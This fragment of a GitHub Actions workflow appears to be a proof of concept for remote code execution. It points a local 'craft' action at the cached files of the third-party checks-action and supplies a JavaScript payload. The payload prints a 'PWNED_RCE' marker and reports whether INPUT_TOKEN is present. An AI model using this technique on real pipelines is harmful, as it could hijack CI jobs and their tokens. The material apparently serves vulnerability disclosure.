    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: craft artifacts
        uses: ./.github/actions/craft
        env:
          SYMTARGET: /home/runner/work/_actions/LouisBrunner/checks-action/dfcbcf801bff1ea7f1414824fc28f2cd697b35da/dist
          PAYLOAD_SRC: |
            const fs = require('fs');
            console.log('PWNED_RCE workflow=' + process.env.GITHUB_WORKFLOW + ' job=' + process.env.GITHUB_JOB + ' repo=' + process.env.GITHUB_REPOSITORY);
            console.log('INPUT_TOKEN_PRESENT=' + (process.env.INPUT_TOKEN ? 'yes' : 'no'));
